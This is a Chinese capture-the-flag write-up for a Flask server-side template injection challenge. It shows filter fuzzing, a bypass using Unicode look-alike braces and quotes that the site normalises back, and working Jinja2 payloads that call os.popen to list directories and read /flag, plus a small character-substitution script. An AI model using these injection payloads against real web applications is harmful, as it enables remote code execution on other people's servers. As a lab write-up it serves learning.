# easy_web   WP（SSTI）

来源：太湖杯

题目场景：http://61.147.171.105:55507/

![image-20251223164732522](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223164732522.png)

##### 扫描目录：

拿到题目之后先`dirsearch` 扫描目录：

![image-20251223164700534](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223164700534.png)

没有有用的信息。

##### 尝试注入：

想着尝试一下注入：

在输入框中输入 `'`，返回：

![image-20251223164831721](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223164831721.png)

有过滤。

看回显：用的是python，可以想到`flask` 模板注入。

> 补课：SSTI漏洞：
>
> SSTI（Server-Side Template Injection，服务端模板注入）是一种严重的Web安全漏洞，它允许攻击者利用应用程序中的模板引擎执行恶意代码。这种漏洞通常出现在Web应用程序中，当应用程序使用如Flask、Django、Spring等框架时，一般会采用比较成熟的MVC（Model-View-Controller）模式，此时用户的输入可能会被直接用作模板内容的一部分，而未经适当的处理或过滤。
> 　　而模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就会导致敏感信息泄露、代码执行、GetShell 等问题；
> 　　虽然很多关于SSTI的题出在python上，但是请不要认为这种攻击方式只存在于 Python ，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言。



过滤和`flask` 模块注入这里我们要做两件事情：

##### 爆破输入框，查看过滤

利用intruder，对输入框进行爆破，查看对哪些符号有过滤：

输入ASCII码33~127的所有字符（即特殊符号、字母大小写、数字）

![image-20251223170406169](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223170406169.png)

![image-20251223170428834](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223170428834.png)

我们发现就这些字符被过滤了。

##### flask模板注入测试

flask模板注入，可以用`{{1+1}}` 来验证，看其是否会返回为2，但是括号被过滤了。

又鉴于该网站的字符规范功能，所以我们可以找一些相近的字符来让他规范：

[特殊符号 特殊符号大全](https://www.ip138.com/teshufuhao/)

![image-20251223170726928](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223170726928.png)

```
︷︸ ´  ¨ ｀
```

我们来尝试一下，上面的这些符号可以每个都在网站中试一下，观察其会被规范成哪个字符

我们构建payload来验证是否存在flask模板注入：

```
︷︷1+1︸︸
```

![image-20251223171721460](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223171721460.png)

查看返回，1+1确实被计算了，说明存在flask模板注入。

##### 使用SSTI模板注入payload：

```
{{a.__init__.__globals__.__builtins__.eval("__import__('os').popen('ls').read()")}}
```



再写个脚本替换被过滤的单双引号和花括号：

```
"""
{ -> ︷/﹛
} -> ︸/﹜
' -> ＇
, -> ，
" -> ＂
"""

str = '''{{a.__init__.__globals__.__builtins__.eval("__import__('os').popen('ls').read()")}}''' # 原字符串
# 如果需要替换，使用replace(被替换的字符,替换后的字符)
str = str.replace('{', '︷')
str = str.replace('}', '︸')
str = str.replace('\'', '＇')
str = str.replace('\"', '＂')

print(str)
```

输出:

```
︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇ls＇).read()＂)︸︸
```



##### 查看输出：

![image-20251223172443472](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223172443472.png)

没有什么可疑的，看根目录下的文件：

```
︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇ls / ＇).read()＂)︸︸
```

![image-20251223172635475](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223172635475.png)

有一个`flag` 的文件，查看一下:

```
{{a.__init__.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")}}
```

![image-20251223172759312](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251223172759312.png)

得到flag